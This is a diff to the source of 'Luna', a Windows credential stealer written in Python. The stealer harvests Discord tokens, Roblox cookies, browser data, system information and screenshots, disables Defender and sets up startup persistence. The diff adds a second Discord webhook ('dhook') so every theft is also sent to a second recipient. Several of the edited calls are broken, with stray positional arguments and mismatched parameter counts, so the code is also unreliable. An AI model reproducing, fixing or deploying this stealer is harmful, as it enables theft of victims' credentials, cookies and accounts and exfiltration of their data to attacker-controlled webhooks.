@@ -51,7 +51,7 @@ os.mkdir(temp_path)
 localappdata = os.getenv("localappdata")
 
 
-def main(webhook: str):
+def main(webhook, dhook: str):
     threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
@@ -207,8 +207,9 @@ def zipup():
 class PcInfo:
     def __init__(self):
         self.get_inf(__CONFIG__["webhook"])
+        self.get_inf(__CONFIG__["dhook"])
 
-    def get_inf(self, webhook):
+    def get_inf(self, webhook, dhook):
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
@@ -245,7 +246,7 @@ class PcInfo:
             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
         }
 
-        requests.post(webhook, json=data)
+        requests.post(webhook, dhook, json=data)
 
 
 class Discord:
@@ -261,6 +262,7 @@ class Discord:
 
         self.grabTokens()
         self.upload(__CONFIG__["webhook"])
+        self.upload(__CONFIG__["dhook"])
 
     def decrypt_val(self, buff, master_key):
         try:
@@ -366,7 +368,7 @@ class Discord:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
-    def robloxinfo(self, webhook):
+    def robloxinfo(self, webhook, dhook):
         if __CONFIG__["roblox"]:
             with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                 robo_cookie = f.read().strip()
@@ -416,9 +418,9 @@ class Discord:
                             "username": "Luna",
                             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
                         }
-                        requests.post(webhook, json=data)
+                        requests.post(webhook, dhook, json=data)
 
-    def upload(self, webhook):
+    def upload(self, webhook, dhook):
         for token in self.tokens:
             if token in self.tokens_sent:
                 continue
@@ -481,10 +483,11 @@ class Discord:
                 "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
             }
 
-            requests.post(webhook, json=data)
+            requests.post(webhook, dhook, json=data)
             self.tokens_sent.append(token)
 
         self.robloxinfo(webhook)
+        self.robloxinfo(dhook)
 
         image = ImageGrab.grab(
             bbox=None,
@@ -513,7 +516,7 @@ class Discord:
             image_data = f.read()
             encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
 
-        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
+        requests.post(webhook, dhook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 
 class Browsers:
@@ -1018,3 +1021,4 @@ class Debug:
 
 if __name__ == '__main__' and os.name == "nt":
     Luna(__CONFIG__["webhook"])
+    Luna(__CONFIG__["dhook"])
